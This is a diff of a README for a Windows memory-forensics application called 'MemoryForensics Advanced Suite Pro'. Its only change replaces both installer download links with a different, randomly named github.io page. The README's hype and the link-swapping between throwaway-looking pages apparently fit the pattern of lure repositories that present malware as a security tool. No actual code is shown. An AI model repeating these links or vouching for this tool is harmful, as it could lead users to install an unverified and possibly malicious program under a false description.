@@ -2,7 +2,7 @@
 
 MemoryForensics Advanced Suite Pro is a cutting-edge Windows desktop application developed for in-depth memory forensics and analysis. This tool enables security professionals and enthusiasts to dump process memory, analyze RAM dumps for forensic artifacts, and detect malicious activities in system memory. Designed for Windows 10/11, it incorporates features inspired by the Volatility Framework but with a user-friendly interface for 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -74,6 +74,6 @@ MemoryForensics is intended for authorized security testing and forensic investi
 
 Access the latest release of MemoryForensics Advanced Suite Pro 2026 by clicking the link below:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This version includes all recent improvements and security patches for optimal performance on Windows 10/11 systems.
